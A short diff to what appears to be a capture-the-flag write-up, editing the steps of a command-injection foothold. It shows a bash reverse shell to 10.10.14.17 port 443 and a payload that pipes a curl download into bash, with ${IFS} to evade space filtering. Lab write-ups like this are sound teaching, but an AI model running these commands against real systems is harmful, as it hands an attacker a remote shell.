@@ -230,6 +230,8 @@ As we know if we are able to receive a curl we can gain access to the machine wi
 
 So we proceed to create a shell.sh file with the following code:
 
+<br />
+
 ```bash
 #!/bin/bash 
 
@@ -239,6 +241,6 @@ bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 
 <br />
 
-Now that we have the file, we run a curl again but poiting to the file and interpreting it with bash:
+Now that we have the file, we run a curl again but poiting to the shell.sh and interpreting it with bash:
 
-- Payload -> `\`curl${IFS}10.10.14.17|bash\``
+- Payload -> `curl${IFS}10.10.14.17|bash`
